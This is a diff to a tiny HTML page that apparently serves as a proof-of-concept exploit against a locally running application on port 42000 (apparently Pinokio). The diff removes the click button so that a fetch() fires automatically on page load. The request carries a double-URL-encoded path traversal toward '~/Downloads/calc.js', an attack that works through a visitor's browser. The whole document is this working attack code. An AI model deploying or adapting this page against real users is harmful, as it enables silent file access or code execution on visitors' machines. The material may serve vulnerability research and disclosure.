@@ -1,22 +1,18 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Test Request to Localhost</title>
+    <title>Auto Request to Localhost</title>
 </head>
 <body>
-    <button id="sendRequest">Send Request</button>
-
     <script>
-        document.getElementById('sendRequest').addEventListener('click', function() {
-            fetch('http://localhost:42000/pinokio/?uri=~/_api/%252E%252E%252F%252E%252E%252FDownloads/calc.js')
-                .then(response => response.text())
-                .then(data => {
-                    console.log('Response:', data);
-                })
-                .catch(error => {
-                    console.error('Error:', error);
-                });
-        });
+        fetch('http://localhost:42000/pinokio/?uri=~/_api/%252E%252E%252F%252E%252E%252FDownloads/calc.js')
+            .then(response => response.text())
+            .then(data => {
+                console.log('Response:', data);
+            })
+            .catch(error => {
+                console.error('Error:', error);
+            });
     </script>
 </body>
 </html>
